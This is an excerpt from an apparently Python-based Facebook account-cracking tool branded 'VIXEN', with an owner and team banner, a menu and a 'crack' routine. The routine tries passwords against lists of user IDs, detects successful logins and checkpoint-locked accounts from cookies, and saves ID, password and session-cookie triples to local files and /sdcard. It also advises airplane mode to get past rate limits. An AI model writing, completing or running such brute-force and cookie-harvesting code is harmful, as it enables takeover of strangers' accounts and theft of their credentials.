...
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/roshan.thokar.686')
	back()
def linex():
...
def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
\x1b[1;91m• OWNER :\x1b[1;91m VIXEN 444
• VERSION  :\x1b[1;91m 4.1.3
• GITHUB :\x1b[1;91m RoshanDona
• TEAM :\x1b[1;91m ꧁Ɇ₳₲ⱠɆ☬₲₳₦₲꧂
\033[1;32m=====================\033[1;37m=====================""")
...
def login123():
	...
	print("""\x1b[38;5;46m[\x1b[1;97m1\x1b[38;5;46m]\x1b[1;97m FILE CLONE""")
	print("""\x1b[38;5;46m[\x1b[1;97m2\x1b[38;5;46m]\x1b[1;97m CONTACT ADMIN""")
		...
		with requests.Session() as rsn:
			try:
				...
				if '"access_token":' in str(response.headers):
					...
					print('[\033[1;31mx\033[1;37m]EXPIRED'%(p))

			except:
				linex()
				print('\033[1;37m[\033[1;31m×\033[1;37m] EXPIRED')
...
def passwrd():
    ...
    linex()
    print("\x1b[1;91m USE AIRPLANE MODE FOR MORE OK IDS\033[1;32m")
    linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[VIXEN] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [VIXEN-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/VIXEN-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				VIXEN(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}VIXEN-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/VIXEN-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("VIXEN")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("VIXEN")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
